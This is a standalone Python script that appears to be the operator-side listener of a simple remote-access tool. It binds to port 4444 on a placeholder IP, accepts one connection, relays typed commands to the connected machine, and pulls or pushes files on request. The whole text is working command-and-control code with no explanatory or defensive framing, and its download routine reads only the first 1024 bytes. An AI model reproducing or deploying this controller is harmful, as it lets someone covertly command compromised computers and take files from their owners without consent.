import socket


try: 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    print ("Socket successfully created")
except socket.error as err: 
    print ("socket creatsion failed with error %s" %(err))

port=4444

#ensure socket is closed from previous session
s.close()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


s.bind(('<Your IP>', port))         
print ("socket binded to %s" %(port)) 
s.listen(5)     
print ("socket is listening")            
c, addr = s.accept()
print ('Got connection from', addr ) 

while True: 
# Establish connection with client.
	user_command=str(input("input command:"))
	#sanitize user input
	user_command=user_command.replace("\n","")
	user_command=user_command.replace("\r","")
	user_command=user_command.replace("\t","")
	user_command=user_command.replace("\0","")
	if user_command=="end":
		c.send(user_command.encode())
		break
	elif user_command=="download":
		c.send(user_command.encode())
		file_name=str(input("input file name:"))
		c.send(file_name.encode())
		with open(file_name, "wb") as f:
			data=c.recv(1024)
			f.write(data)
	elif user_command=="send":
		c.send(user_command.encode())
		file_name=str(input("input file name:"))
		c.send(file_name.encode())
		with open(file_name, "rb") as f:
			data=f.read()
			c.send(data)